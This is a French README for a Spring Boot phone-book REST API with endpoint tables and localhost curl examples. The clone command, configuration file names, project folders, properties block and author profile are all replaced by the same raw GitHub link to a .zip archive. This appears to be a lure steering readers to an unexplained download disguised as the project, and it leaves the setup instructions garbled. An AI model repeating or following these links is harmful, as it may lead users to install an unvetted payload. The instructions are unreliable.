# 📞 Spring Phone Book

Une application de répertoire téléphonique développée avec Spring Boot, offrant une API REST complète pour la gestion des contacts.

## 🚀 Fonctionnalités

- **CRUD complet** : Créer, lire, modifier et supprimer des contacts
- **API REST** : Interface standardisée avec codes de statut HTTP appropriés
- **Base de données MySQL** : Persistance des données avec JPA/Hibernate
- **Architecture MVC** : Structure claire et maintenable
- **Lombok** : Réduction du code boilerplate

## 🛠️ Technologies utilisées

- **Java 17**
- **Spring Boot 3.5.4**
- **Spring Data JPA**
- **MySQL**
- **Lombok**
- **Maven**

## 📋 Prérequis

- Java 17 ou supérieur
- MySQL 8.0 ou supérieur
- Maven 3.6 ou supérieur

## ⚙️ Installation

1. **Cloner le repository**
   ```bash
   git clone https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
   cd spring-phone-book
   ```

2. **Configurer la base de données**
   - Créer une base de données MySQL nommée `phone_book`
   - Modifier les paramètres de connexion dans `https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip`

3. **Lancer l'application**
   ```bash
   mvn spring-boot:run
   ```

L'application sera accessible sur `http://localhost:8080`

## 📚 API Endpoints

| Méthode | Endpoint | Description |
|---------|----------|-------------|
| GET | `/api/contacts` | Récupérer tous les contacts |
| POST | `/api/contacts` | Créer un nouveau contact |
| GET | `/api/contacts/{id}` | Récupérer un contact par ID |
| PUT | `/api/contacts/{id}` | Mettre à jour un contact |
| DELETE | `/api/contacts/{id}` | Supprimer un contact |

## 📝 Exemple d'utilisation

### Créer un contact
```bash
curl -X POST http://localhost:8080/api/contacts \
  -H "Content-Type: application/json" \
  -d '{
    "firstName": "Jean",
    "lastName": "Dupont",
    "phoneNumber": "0123456789"
  }'
```

### Récupérer tous les contacts
```bash
curl http://localhost:8080/api/contacts
```

## 🏗️ Structure du projet

```
src/
├── main/
│   ├── java/bf/kvill/spring_phone_book/
│   │   ├── controller/          # Contrôleurs REST
│   │   ├── model/              # Entités JPA
│   │   ├── repository/         # Repositories Spring Data
│   │   └── https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
│   └── resources/
│       └── https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
└── test/
    └── java/                   # Tests unitaires
```

## 🔧 Configuration

Modifiez `https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip` selon votre environnement :

```properties
https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip
```

## 🤝 Contribution

Les contributions sont les bienvenues ! N'hésitez pas à :

1. Fork le projet
2. Créer une branche pour votre fonctionnalité
3. Commiter vos changements
4. Pousser vers la branche
5. Ouvrir une Pull Request

## 📄 Licence

Ce projet est sous licence MIT. Voir le fichier `LICENSE` pour plus de détails.

## 👨‍💻 Auteur

**Sawadogo Abdel Kaled** - [GitHub](https://raw.githubusercontent.com/kvill01/Spring-boot-phonebook-api/main/overcredulously/Spring-boot-phonebook-api.zip)

---

⭐ N'hésitez pas à donner une étoile si ce projet vous a été utile !